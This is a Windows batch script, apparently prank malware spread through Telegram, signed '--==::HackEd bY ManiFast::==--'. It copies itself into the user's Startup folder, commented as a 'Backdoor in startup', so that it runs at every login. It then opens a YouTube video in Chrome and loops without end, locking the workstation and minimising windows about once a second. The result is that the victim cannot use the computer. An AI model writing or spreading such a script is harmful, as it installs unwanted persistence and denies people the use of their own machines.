@echo off

color 05

:: Point of LOOP


title --==::HackEd bY ManiFast::==--

:: Backdoor in startup
copy C:\Users\%Username%\Downloads\"Telegram Desktop"\dsddsy.bat C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
:: with %Username%

:: Vol (not work)
::nircmd.exe setsysvolume 6553

:: Brow

::old
::start msedge https://www.youtube.com/watch?v=jMBsK5BxTaw
::new
start chrome https://www.youtube.com/watch?v=ddYAAe7ejSA&ab_channel=%D0%95%D0%B3%D0%BE%D1%80%D0%94%D0%B5%D0%B1%D0%B8%D0%BB%D0%BE%D0%B2

::microsoft-edge:
::firefox.exe
::YandexBrowser
::msedge
::chrome

:UP

timeout 4
::Hide
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"

:: Screen (many times)

Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1

:: timeout 10 if test
timeout 1

:: LOOP !!

GOTO UP

pause
exit
